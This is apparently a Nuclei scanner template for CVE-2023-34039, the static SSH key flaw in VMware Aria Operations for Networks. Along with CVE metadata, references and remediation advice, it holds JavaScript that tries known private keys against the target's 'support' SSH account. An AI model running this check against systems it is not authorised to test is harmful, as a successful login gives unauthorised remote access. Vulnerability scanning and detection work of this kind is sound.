id: CVE-2023-34039
info:
  author: tarunKoyalwar
  classification:
    cpe: cpe:2.3:a:vmware:aria_operations_for_networks:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-34039
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-327
    epss-percentile: 0.99782
    epss-score: 0.93171
  description: 'VMWare Aria Operations for Networks (vRealize Network Insight) Static
    SSH key RCE (CVE-2023-34039)

    Version: All versions from 6.0 to 6.10

    '
  impact: 'Successful exploitation of this vulnerability can lead to remote code execution
    or a complete system crash.

    '
  metadata:
    product: aria_operations_for_networks
    vendor: vmware
    verified: true
  name: VMWare Aria Operations - Remote Code Execution
  reference:
  - https://github.com/sinsinology/CVE-2023-34039.git
  - https://nvd.nist.gov/vuln/detail/CVE-2023-34039
  - http://packetstormsecurity.com/files/174452/VMWare-Aria-Operations-For-Networks-Remote-Code-Execution.html
  - http://packetstormsecurity.com/files/175320/VMWare-Aria-Operations-For-Networks-SSH-Private-Key-Exposure.html
  - https://www.vmware.com/security/advisories/VMSA-2023-0018.html
  remediation: 'Apply the latest security patches or updates provided by the vendor
    to fix this vulnerability.

    '
  severity: critical
  tags: js,packetstorm,cve,ssh,vmware,aria,rce,fuzz,vrealize,cve2023,vuln
javascript:
- args:
    Host: '{{Host}}'
    Port: '22'
    key: '{{keys}}'
    keysDir: '{{keysDir}}'
  code: 'let m = require(''nuclei/ssh'')

    let c = m.SSHClient()

    c.ConnectWithKey(Host,Port,''support@''+Host,key) // returns true if connection
    is successful

    '
  init: 'let m = require(''nuclei/fs'');

    let privatekeys = m.ReadFilesFromDir(keysDir)

    updatePayload(''keys'',privatekeys)

    '
  matchers:
  - dsl:
    - success && response
    type: dsl
  payloads:
    keys:
    - dummy1
    - dummy2
  pre-condition: 'isPortOpen(Host,Port)

    '
  stop-at-first-match: true
  threads: 10
variables:
  keysDir: helpers/payloads/cve-2023-34039-keys
